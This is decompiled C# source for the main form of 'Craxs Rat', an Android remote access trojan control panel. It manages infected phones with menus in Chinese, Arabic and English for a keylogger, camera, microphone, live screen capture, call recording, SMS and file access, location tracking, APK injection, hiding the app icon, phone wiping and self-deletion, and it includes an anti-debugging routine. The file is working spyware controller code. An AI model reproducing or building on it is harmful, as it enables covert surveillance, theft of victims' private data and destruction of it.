    private ToolStripMenuItem 擦除手机数据ToolStripMenuItem;
    internal ToolStripMenuItem ToolStripMenuItem2;
    private DrakeUILabel drakeUILabel6;
    private DrakeUILabel drakeUILabel2;
    private DrakeUILabel drakeUILabel7;
    internal Label label10;
    internal DataGridViewImageColumn DataGridViewImageColumn1;
    internal DataGridViewTextBoxColumn DataGridViewTextBoxColumn1;
    internal DataGridView DGVSERVS;
    private DataGridViewImageColumn Start;
    private DataGridViewTextBoxColumn portnam;
    private DataGridViewTextBoxColumn DataGridViewTextBoxColumn6;
    private DataGridViewTextBoxColumn Key;
    internal PictureBox pictureBox1;
    internal DrakeUILabel drakeUILabel8;
    internal ToolStripMenuItem UsdtToolStripMenuItem
	;

	[DllImport("user32.dll")]
	public static extern IntPtr FindWindow(string strclassName, string strWindowName);

	[DllImport("Kernel32.dll")]
	public static extern IntPtr OutputDebugString(string Txt);

	[DllImport("Ntdll.dll")]
	public static extern int NtSetInformationThread(IntPtr hThread, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

	[DllImport("Kernel32.dll")]
	public static extern IntPtr GetCurrentThread();

	public static int HDB()
	{
		MyStatus = NtSetInformationThread(GetCurrentThread(), 17, default(IntPtr), 0);
		if (MyStatus != 0)
		{
			Interaction.MsgBox("Error : X00101", (MsgBoxStyle)MyStatus);
			Debugger.Break();
			return 0;
		}
		ISDB = false;
		return 1;
	}

	public void Translateme()
	{
		switch (RegistryHandler.Get_Language())
		{
			case "CN":
				infobox.Text = "信息";
				droperbtn.Text = "安装人员";
				studiobtn.Text = "工作室";
				SentBox.Text = "发了";
				ReciveBox.Text = "收到";
				RecentBox.Text = "最近";
				infotitlepanel.Text = "仪表板";
				activityzpanel.Text = "最新活动";
				notifispanel.Text = "最近的通知";
				mappanel.Text = "连接图";
				callspanel.Text = "最近通话";
				notifiaisbtntop.Text = "通知";
				Home_Btn.Text = "主页";
				Clients_Btn.Text = "客户";
				blockbtn.Text = "阻止页面";
				Connection_btn.Text = "连接页面";
				Build_btn.Text = "新应用";
				inject_btn.Text = "注入应用程序";
				Settings_btn.Text = "程序设置";
				porttext.Watermark = "连接端口";
				passtxt.Watermark = "连接键";
				checksavepass.Text = Codes.Translate(checksavepass.Text, "en", "zh");
				serversbtn.Text = Codes.Translate(serversbtn.Text, "en", "zh");
				ToolTips.SetToolTip(Home_Btn, "主页");
				ToolTips.SetToolTip(Clients_Btn, "客户页面");
				ToolTips.SetToolTip(blockbtn, "阻止页面");
				ToolTips.SetToolTip(Connection_btn, "连接页面");
				//ToolTips.SetToolTip(Build_btn, "应用程序生成器");
				ToolTips.SetToolTip(inject_btn, "应用程序注入器");
				ToolTips.SetToolTip(Settings_btn, "程序设置");
				toblocktext.Watermark = Codes.Translate(toblocktext.Watermark, "en", "zh");
				searchtext.Watermark = "按名称、国家、地址搜索";
				break;
			case "AR":
				infobox.Text = "معلومات";
				SentBox.Text = "الأرسال";
				ReciveBox.Text = "التحميل";
				RecentBox.Text = "جديد";
				infotitlepanel.Text = "الرئيسية";
				porttext.Watermark = "منفذ الاتصال";
				passtxt.Watermark = "مفتاح الاتصال";
				notifispanel.Text = "اخر التنبيهات";
				mappanel.Text = "خريطة الاتصالات";
				callspanel.Text = "اخر المكالمات";
				checksavepass.Text = Codes.Translate(checksavepass.Text, "en", "ar");
				serversbtn.Text = Codes.Translate(serversbtn.Text, "en", "ar");
				Home_Btn.Text = "الرئيسية";
				Clients_Btn.Text = "المستخدمين";
				blockbtn.Text = "قائمة الحظر";
				Connection_btn.Text = "قائمة الاتصالات";
				//Build_btn.Text = "إنشاء تطبيق";
				inject_btn.Text = "حقن تطبيق";
				Settings_btn.Text = "إعدادات البرنامج";
				activityzpanel.Text = "اخر النشاطات";
				ToolTips.SetToolTip(Home_Btn, "الرئيسية");
				ToolTips.SetToolTip(Clients_Btn, "عملاء");
				ToolTips.SetToolTip(blockbtn, "قائمة الحظر");
				ToolTips.SetToolTip(Connection_btn, "قائمة الاتصالات");
				//ToolTips.SetToolTip(Build_btn, "إنشاء تطبيق");
				ToolTips.SetToolTip(inject_btn, "حقن تطبيق");
				ToolTips.SetToolTip(Settings_btn, "إعدادات البرنامج");
				toblocktext.Watermark = Codes.Translate(toblocktext.Watermark, "en", "ar");
				searchtext.Watermark = "البحث بالاسم،البلد،العنوان، ...";
				notifiaisbtntop.Text = "إشعارات";
				studiobtn.Text = "الاستوديو";
				droperbtn.Text = "المثتب";
				break;
			case "EN":
				ToolTips.SetToolTip(Home_Btn, "Home");
				ToolTips.SetToolTip(Clients_Btn, "Clients");
				ToolTips.SetToolTip(blockbtn, "Block List");
				ToolTips.SetToolTip(Connection_btn, "Connections");
				//ToolTips.SetToolTip(Build_btn, "Build Apk");
				ToolTips.SetToolTip(inject_btn, "inject Apk");
				ToolTips.SetToolTip(Settings_btn, "Settings");
				break;
		}
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				FWctx.Items[0].Text = "允许";
				FWctx.Items[1].Text = "禁止";
				FWctx.Items[2].Text = "添加到轨道";
				TRKctx.Items[0].Text = "添加应用程序";
				TRKctx.Items[1].Text = "截图";
				TRKctx.Items[2].Text = "记录";
				TRKctx.Items[3].Text = "删除截图";
				TRKctx.Items[4].Text = "删除记录";
				TRKctx.Items[5].Text = "停止追踪";
				ctxmenu.Items[0].Text = "管理";
				ToolStripMenuItem toolStripMenuItem = (ToolStripMenuItem)ctxmenu.Items[0];
				toolStripMenuItem.DropDownItems[0].Text = "文件   ";
				toolStripMenuItem.DropDownItems[1].Text = "短信";
				toolStripMenuItem.DropDownItems[2].Text = "来电";
				toolStripMenuItem.DropDownItems[3].Text = "往来";
				toolStripMenuItem.DropDownItems[4].Text = "帐户";
				toolStripMenuItem.DropDownItems[5].Text = "应用";
				toolStripMenuItem.DropDownItems[6].Text = "权限";
				ctxmenu.Items[2].Text = "监控";
				ToolStripMenuItem toolStripMenuItem2 = (ToolStripMenuItem)ctxmenu.Items[2];
				toolStripMenuItem2.DropDownItems[0].Text = "手机屏幕";
				toolStripMenuItem2.DropDownItems[1].Text = "屏幕阅读器 2";
				toolStripMenuItem2.DropDownItems[2].Text = "相机";
				toolStripMenuItem2.DropDownItems[3].Text = "麦克风";
				toolStripMenuItem2.DropDownItems[4].Text = "键盘记录器";
				toolStripMenuItem2.DropDownItems[5].Text = "地点";
				toolStripMenuItem2.DropDownItems[6].Text = "浏览器";
				toolStripMenuItem2.DropDownItems[7].Text = "通话记录器";
				toolStripMenuItem2.DropDownItems[8].Text = "自动答题器";
				toolStripMenuItem2.DropDownItems[9].Text = "屏幕阅读器";
				ctxmenu.Items[4].Text = "行政";
				ToolStripMenuItem toolStripMenuItem3 = (ToolStripMenuItem)ctxmenu.Items[4];
				toolStripMenuItem3.DropDownItems[0].Text = "请求管理员权限";
				toolStripMenuItem3.DropDownItems[1].Text = "锁屏";
                toolStripMenuItem3.DropDownItems[2].Text = "显示图标";
                toolStripMenuItem3.DropDownItems[3].Text = "隐藏图标";
                toolStripMenuItem3.DropDownItems[4].Text = "擦除手机数据";

                ctxmenu.Items[6].Text = "工具";
				ToolStripMenuItem toolStripMenuItem4 = (ToolStripMenuItem)ctxmenu.Items[6];
				toolStripMenuItem4.DropDownItems[0].Text = "电话号码";
				toolStripMenuItem4.DropDownItems[1].Text = "安装软件";
				toolStripMenuItem4.DropDownItems[2].Text = "发送通知";
				toolStripMenuItem4.DropDownItems[3].Text = "剪贴板";
				toolStripMenuItem4.DropDownItems[4].Text = "打开链接";
				toolStripMenuItem4.DropDownItems[5].Text = "终端";
				ctxmenu.Items[8].Text = "额外的";
				ToolStripMenuItem toolStripMenuItem5 = (ToolStripMenuItem)ctxmenu.Items[8];
				toolStripMenuItem5.DropDownItems[0].Text = "通知";
				toolStripMenuItem5.DropDownItems[1].Text = "通话活动";
				toolStripMenuItem5.DropDownItems[2].Text = "电话信息";
				ctxmenu.Items[10].Text = "联系";
				ToolStripMenuItem toolStripMenuItem6 = (ToolStripMenuItem)ctxmenu.Items[10];
				toolStripMenuItem6.DropDownItems[0].Text = "重新连接";
				toolStripMenuItem6.DropDownItems[1].Text = "堵塞";
				toolStripMenuItem6.DropDownItems[2].Text = "禁用反删除";
				toolStripMenuItem6.DropDownItems[3].Text = "自行删除";
				ctxmenu.Items[12].Text = "键盘 (beta)";
				ctxmenu.Items[14].Text = "客户文件夹";
			}
		}
		else
		{
			ctxmenu.Items[0].Text = "إدارة";
			ToolStripMenuItem toolStripMenuItem7 = (ToolStripMenuItem)ctxmenu.Items[0];
			toolStripMenuItem7.DropDownItems[0].Text = "الملفات";
			toolStripMenuItem7.DropDownItems[1].Text = "الرسائل";
			toolStripMenuItem7.DropDownItems[2].Text = "المكالمات";
			toolStripMenuItem7.DropDownItems[3].Text = "الأسماء";
			toolStripMenuItem7.DropDownItems[4].Text = "الحسابات";
			toolStripMenuItem7.DropDownItems[5].Text = "التطبيقات";
			toolStripMenuItem7.DropDownItems[6].Text = "الصلاحيات";
			ctxmenu.Items[2].Text = "مراقبة";
			ToolStripMenuItem toolStripMenuItem8 = (ToolStripMenuItem)ctxmenu.Items[2];
			toolStripMenuItem8.DropDownItems[0].Text = "شاشة الهاتف";
			toolStripMenuItem8.DropDownItems[1].Text = "قراءة الشاشة 2";
			toolStripMenuItem8.DropDownItems[2].Text = "الكاميرا";
			toolStripMenuItem8.DropDownItems[3].Text = "الميكروفون";
			toolStripMenuItem8.DropDownItems[4].Text = "مسجل المفاتيح";
			toolStripMenuItem8.DropDownItems[5].Text = "الموقع";
			toolStripMenuItem8.DropDownItems[6].Text = "المتصفح";
			toolStripMenuItem8.DropDownItems[7].Text = "مسجل المكالمات";
			toolStripMenuItem8.DropDownItems[8].Text = "شاشة المس";
			toolStripMenuItem8.DropDownItems[9].Text = "قراءة الشاشة";
			ctxmenu.Items[4].Text = "مسؤول";
			ToolStripMenuItem toolStripMenuItem9 = (ToolStripMenuItem)ctxmenu.Items[4];
			toolStripMenuItem9.DropDownItems[0].Text = "تفعيل مسؤول الجهاز";
			toolStripMenuItem9.DropDownItems[1].Text = "قفل الهاتف";
			toolStripMenuItem9.DropDownItems[2].Text = "حذف ملفات الهاتف";
			ctxmenu.Items[6].Text = "أدواة";
			ToolStripMenuItem toolStripMenuItem10 = (ToolStripMenuItem)ctxmenu.Items[6];
			toolStripMenuItem10.DropDownItems[0].Text = "إجراء إتصال";
			toolStripMenuItem10.DropDownItems[1].Text = "تثبيت تطبيق";
			toolStripMenuItem10.DropDownItems[2].Text = "إرسال تنبيه";
			toolStripMenuItem10.DropDownItems[3].Text = "الحافظة";
			toolStripMenuItem10.DropDownItems[4].Text = "فتح موقع";
			toolStripMenuItem10.DropDownItems[5].Text = "موجه الأوامر";
			ctxmenu.Items[8].Text = "المزيد";
			ToolStripMenuItem toolStripMenuItem11 = (ToolStripMenuItem)ctxmenu.Items[8];
			toolStripMenuItem11.DropDownItems[0].Text = "إشعارات الهاتف";
			toolStripMenuItem11.DropDownItems[1].Text = "المكالمات الحالية";
			toolStripMenuItem11.DropDownItems[2].Text = "معلومات الهاتف";
			ctxmenu.Items[10].Text = "الإتصال";
			ToolStripMenuItem toolStripMenuItem12 = (ToolStripMenuItem)ctxmenu.Items[10];
			toolStripMenuItem12.DropDownItems[0].Text = "إعادة الأتصال";
			toolStripMenuItem12.DropDownItems[1].Text = "حظر المستخدم";
			toolStripMenuItem12.DropDownItems[2].Text = "إيقاف منع الحذف";
			toolStripMenuItem12.DropDownItems[3].Text = "حذف التطبيق";
			ctxmenu.Items[12].Text = "لوحة المفاتيح (beta)";
			ctxmenu.Items[14].Text = "ملفات المستخدم";
			TRKctx.Items[0].Text = "إضافة تطبيق";
			TRKctx.Items[1].Text = "لقطات الشاشة";
			TRKctx.Items[2].Text = "السجلات";
			TRKctx.Items[3].Text = "حذف  لقطات الشاشة";
			TRKctx.Items[4].Text = "حذف السجلات";
			TRKctx.Items[5].Text = "إيقاف التتبع";
			FWctx.Items[0].Text = "السماح";
			FWctx.Items[1].Text = "حظر";
			FWctx.Items[2].Text = "اضافة للتعقب";
		}
	}

	public void Newinstance()
	{
		InitializeComponent();
		RegistryHandler.iniliz();
		if (Conversions.ToBoolean(Operators.NotObject(Codes.inializeReg())))
		{
			Interaction.MsgBox("Error Reg Config");
			Environment.Exit(0);
		}
		if (RegistryHandler.Get_Language() == null)
		{
			LanguageSelector languageSelector = new LanguageSelector();
			languageSelector.ShowDialog();
			switch (languageSelector.SelectedLang)
			{
				default:
					RegistryHandler.Set_Language("EN");
					break;
				case "CN":
					RegistryHandler.Set_Language("CN");
					break;
				case "EN":
					RegistryHandler.Set_Language("EN");
					break;
				case "AR":
					RegistryHandler.Set_Language("AR");
					break;
			}
		}
		Translateme();
		SCANER = new clsComputerInfo();
		Data.MainForm = this;
	}
    private SoundPlayer soundPlayer;
    public CraxsMain()
	{
		base.Load += EagleSpyMain_Load;
		base.Closing += AngelAndroidForm_Closing;
		base.FormClosing += AngelAndroidForm_FormClosing;
		base.Deactivate += CypherRat_Deactivate;
		base.Activated += CypherRat_Activated;
		PORTs = "";
		server = new List<Accept>();
		Myname = "Craxs Rat";
		Alive = true;
		DKF = "";
		DKD = "BRTHRRTBSA";
		GlobalMap = new GeoMap();
		Globalvlues = null;
		NumWorkers = 0;
		SCANER = null;
		isactive = true;
		searchbefore = new List<DataGridViewRow>();
		Newinstance();
	}

	private void NotifyI()
	{
		notfi.Visible = true;
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void Countryclickhandelr(object arg1, MapData arg2)
	{
		Point position = Cursor.Position;
		checked
		{
			position.Y += (int)Math.Round((double)Cursor.Size.Height * 1.5);
			ToolTips.Show(arg2.Name, this, PointToClient(position), 3000);
		}
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_28_EagleSpyMain_Load))]
	[DebuggerStepThrough]
	private void EagleSpyMain_Load(object sender, EventArgs e)
	{
		VB_0024StateMachine_28_EagleSpyMain_Load stateMachine = new VB_0024StateMachine_28_EagleSpyMain_Load();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024VB_0024Local_sender = sender;
		stateMachine._0024VB_0024Local_e = e;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
      
        cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        soundPlayer = new SoundPlayer();

        // Set the sound location to the .wav file in the "Sounds" folder next to the executable
        string soundFolderPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "res/Audio");
        string soundFilePath = Path.Combine(soundFolderPath, "eagle.wav");

        soundPlayer.SoundLocation = soundFilePath;
        soundPlayer.Play();
    }

	private void SizeDGV(DataGridView dgv)
	{
		dgv.ScrollBars = ScrollBars.None;
		checked
		{
			int num = dgv.Rows.GetRowsHeight(DataGridViewElementStates.None) + dgv.ColumnHeadersHeight;
			num += dgv.Rows.Count * 4;
			int num2 = dgv.Columns.GetColumnsWidth(DataGridViewElementStates.None) + dgv.RowHeadersWidth;
			dgv.ClientSize = new Size(num2, num);
		}
	}

	public string GetExceptionInfo(Exception ex)
	{
		AlertButton.Text	 = "Something Error";

		return AlertButton.Text;
		//int hRForException = Marshal.GetHRForException(ex);
		//string text = ex.GetType().ToString() + "(0x" + hRForException.ToString("X8") + "): " + ex.Message + Environment.NewLine + ex.StackTrace + Environment.NewLine;
		//StackTrace stackTrace = new StackTrace(ex, fNeedFileInfo: true);
		//StackFrame[] frames = stackTrace.GetFrames();
		//foreach (StackFrame stackFrame in frames)
	}
			//if (stackFrame.GetFileLineNumber() > 0)
				//text = text + "Line:" + Conversions.ToString(stackFrame.GetFileLineNumber()) + " Filename: " + Path.GetFileName(stackFrame.GetFileName()) + Environment.NewLine;
	

	private void AngelAndroidForm_Closing(object sender, CancelEventArgs e)
	{
		FormEventArgsClosing();
	}

	public void FormEventArgsClosing()
	{
		try
		{
			notfi.Visible = false;
			Statustimer.Stop();
			monitortimer.Stop();
			if (checksavepass.Checked)
			{
				MySettingsProperty.Settings.savepass = true;
				MySettingsProperty.Settings.Save();
			}
			else
			{
				MySettingsProperty.Settings.savepass = false;
				MySettingsProperty.Settings.Save();
			}
		}
		catch (Exception)
        {
            ////ProjectData.SetProjectError(projectError);
            ////////CraxsAlert.Showinformation("Sorry");
            //////CraxsAlert.Showinformation("Sorry");;
        }
        checked
		{
			try
			{
				Alive = false;
				Thread.Sleep(5);
				if (server != null)
				{
					int num = server.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						try
						{
							server[i].MainListner.Stop();
							server[i].MainListner.Server.Close();
						}
                        catch (Exception)
                        {
                            ////ProjectData.SetProjectError(projectError);
                            ////////CraxsAlert.Showinformation("Sorry");
                            //////CraxsAlert.Showinformation("Sorry");;
                        }
                    }
				}
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
            try
			{
				PORTs = "";
				foreach (DataGridViewRow item in (IEnumerable)DGVSERVS.Rows)
				{
					ref string pORTs = ref PORTs;
					pORTs = pORTs + item.Cells[1].Value.ToString() + ">";
				}
				MySettingsProperty.Settings.ports = PORTs;
				MySettingsProperty.Settings.Save();
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
            Application.ExitThread();
			Environment.Exit(0);
		}
	}

	public void notfi_MouseClick(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			if (base.WindowState != 0)
				base.WindowState = FormWindowState.Normal;
			base.TopMost = true;
			base.TopMost = false;
		}
	}

	

	private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		FormEventArgsClosing();
	}

	public void StartWorkercheck()
	{
		NumWorkers = Operators.AddObject(NumWorkers, 1);
		Workers = new BackgroundWorker[checked(Conversions.ToInteger(NumWorkers) + 1)];
		Workers[Conversions.ToInteger(NumWorkers)] = new BackgroundWorker();
		Workers[Conversions.ToInteger(NumWorkers)].WorkerReportsProgress = true;
		Workers[Conversions.ToInteger(NumWorkers)].WorkerSupportsCancellation = true;
		Workers[Conversions.ToInteger(NumWorkers)].DoWork += myworker;
		Workers[Conversions.ToInteger(NumWorkers)].RunWorkerAsync();
	}

	private void myworker(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(1000);
		//PortsManager.Done(new object[1] { "Security Check" });
		PortsManager.opebbtn(new object[1] { "" });
	}

	public void addLog(object[] objs)
	{
		if (DataLog.InvokeRequired)
		{
			addLogback method = addLog;
			DataLog.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		string text2 = Conversions.ToString(objs[2]);
		string text3 = Conversions.ToString(objs[3]);
		DataLog.Rows.Add(image, text, text2, text3, DateAndTime.Now.ToShortTimeString().ToString());
		if (checkclearlogs.Checked && DataLog.Rows.Count > 20)
			DataLog.Rows.Clear();
	}

	public void LogNotifi(object[] objs)
	{
		if (DGVNOTF.InvokeRequired)
		{
			deleNotifidgv method = LogNotifi;
			DGVNOTF.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		if (DGVNOTF.Rows.Count >= 100)
			DGVNOTF.Rows.Remove(DGVNOTF.Rows[0]);
		DGVNOTF.Rows.Add(image, text);
	}

	public void LogCalls(object[] objs)
	{
		if (DGVCALLS.InvokeRequired)
		{
			delecallsidgv method = LogCalls;
			DGVCALLS.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		if (DGVCALLS.Rows.Count >= 100)
			DGVCALLS.Rows.Remove(DGVCALLS.Rows[0]);
		DGVCALLS.Rows.Add(image, text);
	}

	public void Logalert(object[] objs)
	{
		if (DGVALRTS.InvokeRequired)
		{
			delealertsidgv method = Logalert;
			DGVALRTS.Invoke(method, new object[1] { objs });
			return;
		}
		Image image = (Image)objs[0];
		string text = Conversions.ToString(objs[1]);
		if (DGVALRTS.Rows.Count >= 100)
			DGVALRTS.Rows.Remove(DGVALRTS.Rows[0]);
		DGVALRTS.Rows.Add(image, text);
	}

	public void UpdateForms(Client TargetClient)
	{
		foreach (Form openForm in Application.OpenForms)
		{
			try
			{
				if (openForm != null && openForm.Tag != null)
				{
					CameraManager cameraManager = new CameraManager();
					if (Operators.CompareString(openForm.Tag.ToString(), "Cam_" + TargetClient.UUID, TextCompare: false) == 0)
					{
						cameraManager = (CameraManager)openForm;
						cameraManager.Name = "Camera_Manager_" + TargetClient.ClientRemoteAddress;
						cameraManager.Tag = "Cam_" + TargetClient.UUID;
						if (Operators.CompareString(cameraManager.CamerID, "null", TextCompare: false) != 0)
						{
							cameraManager.classClient = TargetClient;
							cameraManager.Client = TargetClient.myClient;
							cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							cameraManager.Selected(cameraManager.CamerID);
							cameraManager.statustext.Text = "Reconnecting....";
							cameraManager.CAM0.Image = Resources.loading_please_wait;
						}
						else
						{
							cameraManager.classClient = TargetClient;
							cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							cameraManager.Text = string.Format("{0} - IP:{1}", "Camera Manager", TargetClient.ClientAddressIP);
							if (cameraManager.classClient != null)
							{
								reso.Directory_Exist(cameraManager.classClient);
								cameraManager.tmpFolderUSER = TargetClient.FolderUSER;
							}
							cameraManager.Client = cameraManager.classClient.myClient;
							cameraManager.classCamera = TargetClient;
							cameraManager.TempImage = new PictureBox();
						}
					}
				}
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
            try
			{
				if (openForm != null && openForm.Tag != null && Operators.CompareString(openForm.Tag.ToString(), "screen_" + TargetClient.UUID, TextCompare: false) == 0)
				{
					ScreenShoter screenShoter = (ScreenShoter)openForm;
					if (screenShoter != null)
					{
						if (screenShoter.LIVE)
						{
							string[] array = TargetClient.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								TargetClient.myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:on:" + screenShoter.Qualtibox.Text + "~" + screenShoter.FPSBOX.Text + "~" + TargetClient.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + TargetClient.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								TargetClient
							};
							TargetClient.SendMessage(parametersObjects);
							screenShoter.toptitle.Text = "Reconnecting , Please Wait...";
							screenShoter.Livepicbox.Image = Resources.loading_please_wait;
							screenShoter.StartButton.Enabled = false;
							screenShoter.StopButton.Enabled = true;
							screenShoter.vewpnl.Enabled = true;
							screenShoter.Livepicbox.Enabled = true;
							screenShoter.LIVE = true;
							screenShoter.refreshtimer.Enabled = true;
							screenShoter.refreshtimer.Start();
						}
						else
						{
							string name = "Live_Screen_" + TargetClient.ClientRemoteAddress;
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", TargetClient.ClientAddressIP);
							screenShoter.Tag = TargetClient.ClientAddressIP;
							screenShoter.classClient = TargetClient;
							screenShoter.Client = TargetClient.myClient;
							screenShoter.toptitle.Text = "Client Ready...";
							screenShoter.DownloadsFolder = TargetClient.FolderUSER;
							screenShoter.Livepicbox.Image = null;
							screenShoter.Tag = "screen_" + TargetClient.UUID;
						}
					}
				}
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
            try
			{
				if (openForm != null && openForm.Tag != null && Operators.CompareString(openForm.Tag.ToString(), "File" + TargetClient.UUID, TextCompare: false) == 0)
				{
					FileManager fileManager = (FileManager)openForm;
					fileManager.Tag = "File" + TargetClient.UUID;
					fileManager.Name = "File_Manager_File" + TargetClient.UUID;
					fileManager.Title = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
					fileManager.Text = string.Format("{0} - ID:{1}", "File Manager", TargetClient.UUID);
					fileManager.Client = TargetClient.myClient;
					fileManager.classClient = TargetClient;
					fileManager.ver = TargetClient.VersionClient;
					fileManager.DGV0.AutoGenerateColumns = false;
					fileManager.DGV0.Columns[5].DisplayIndex = 0;
					fileManager.viwimage.Image = null;
					break;
				}
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
        }
	}

	public void Addnewrow(object[] objs)
	{
		if (ClientsWindow.InvokeRequired)
		{
			deleaddnewrow method = Addnewrow;
			ClientsWindow.Invoke(method, new object[1] { objs });
			return;
		}
		try
		{
			Client client = (Client)objs[0];
			lock (Data._clientRowIndices)
			{
				if (Data._clientRowIndices.ContainsKey(client.UUID))
				{
					try
					{
						Client client2 = Data._clientRowIndices[client.UUID];
						int index = Data._clientRowIndices[client.UUID].Row.Index;
						string[] array = client.Keys.Split(':');
						ClientsWindow.Rows[index].Cells[0].Value = reso.GetScreen(client.Screen);
						ClientsWindow.Rows[index].Cells[1].Value = client.Wallpaper;
						ClientsWindow.Rows[index].Cells[2].Value = client.Flag;
						ClientsWindow.Rows[index].Cells[3].Value = client.ClientName;
						ClientsWindow.Rows[index].Cells[4].Value = client.Country;
						ClientsWindow.Rows[index].Cells[5].Value = client.android;
						ClientsWindow.Rows[index].Cells[6].Value = client.Phone_model;					
						ClientsWindow.Rows[index].Cells[7].Value = client.Statistics;
						ClientsWindow.Rows[index].Tag = client.UUID;
						ClientsWindow.Rows[index].Cells[8].Tag = client;
						ClientsWindow.Rows[index].Cells[6].Tag = client.UUID;
						ClientsWindow.Rows[index].Cells[2].Tag = client.UUID;
						client.Row = client2.Row;
						client2 = client;
						client.Statistics = "Reset";
						ClientsWindow.Rows[index].Cells[7].Style.ForeColor = System.Drawing.Color.Lime;
					}
                    catch (Exception)
                    {
                        //////CraxsAlert.Showinformation("Sorry");;
                    }
                    Data._clientRowIndices[client.UUID] = client;
				}
				else
				{
					string[] array2 = client.Keys.Split(':');
					int index2 = ClientsWindow.Rows.Add(reso.GetScreen(client.Screen), client.Wallpaper, client.Flag, client.ClientName, client.Country, client.ClientAddressIP + ":" + array2[1], client.android, client.Phone_model, Codes.BlankImage(), Codes.BlankImage(), reso.GetBattery(client.Battery), client.Wifi, "", client.ClientDefender, reso.CheckAdmin(client.IsAdminActive), "New", client.installdate);
					client.Row = ClientsWindow.Rows[index2];
					ClientsWindow.Rows[index2].Tag = client.UUID;
					ClientsWindow.Rows[index2].Cells[8].Tag = client;
					ClientsWindow.Rows[index2].Cells[6].Tag = client.UUID;
					ClientsWindow.Rows[index2].Cells[2].Tag = client.UUID;
					Data._clientRowIndices[client.UUID] = client;
					ClientsWindow.Rows[index2].Cells[15].Style.ForeColor = System.Drawing.Color.Lime;
					string toolTipText = "Client-Info\r\nName:" + client.ClientName + "\r\nDefender:" + client.ClientDefender + "\r\nFrom:" + client.Country + "\r\nHost:" + array2[6] + "\r\nip:" + array2[0] + "\r\nAndorid:" + client.android + "\r\nPort:" + array2[1] + "\r\n";
					ClientsWindow.Rows[index2].Cells[0].ToolTipText = toolTipText;
					if (Operators.CompareString(SpySettings.SOHW_ALERT, "Yes", TextCompare: false) == 0)
					{
						string msg = "Name: " + client.ClientName + "\r\nCountry: " + client.Country;
						CraxsAlert.ShowCustome(msg, client.Wallpaper, System.Drawing.Color.Black, System.Drawing.Color.Lime);
					}
				}
			}
			UpdateForms(client);
		}
        catch (Exception)
        {
            //////CraxsAlert.Showinformation("Sorry");;
        }
    }

	public void RemoveCard(DataGridViewRow row, string uuid)
	{
		_Closure_0024__56_002D0 arg = default(_Closure_0024__56_002D0);
		_Closure_0024__56_002D0 CS_0024_003C_003E8__locals0 = new _Closure_0024__56_002D0(arg);
		CS_0024_003C_003E8__locals0._0024VB_0024Me = this;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_row = row;
		CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid = uuid;
		if (base.InvokeRequired)
		{
			Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
			{
				CS_0024_003C_003E8__locals0._0024VB_0024Me.RemoveCard(CS_0024_003C_003E8__locals0._0024VB_0024Local_row, CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid);
			}));
			return;
		}
		try
		{
			string text = "null";
			try
			{
				if (CS_0024_003C_003E8__locals0._0024VB_0024Local_row != null)
				{
					text = Conversions.ToString(CS_0024_003C_003E8__locals0._0024VB_0024Local_row.Cells[6].Tag);
					ClientsWindow.Rows.Remove(CS_0024_003C_003E8__locals0._0024VB_0024Local_row);
					lock (Data._clientRowIndices)
					{
						if (Data._clientRowIndices.ContainsKey(CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid))
							Data._clientRowIndices.Remove(CS_0024_003C_003E8__locals0._0024VB_0024Local_uuid);
					}
				}
			}
            catch (Exception)
            {
                //////CraxsAlert.Showinformation("Sorry");;
            }
            if (Operators.CompareString(text, "null", TextCompare: false) == 0 || Operators.CompareString(text, "null", TextCompare: false) == 0)
				return;
			string name = "Calls_Manager_" + text;
			Form form = MyProject.Application.OpenForms[name];
			string[] array = new string[2] { "Close windows", "Disconnected ---> " };
			if (form != null && !form.IsDisposed)
			{
				if (Operators.CompareString(SpySettings.DISCONNECTED, array[0], TextCompare: false) == 0)
					form.Close();
				else
				{
					string text2 = form.Text;
					form.Text = array[1] + text2;
				}
			}
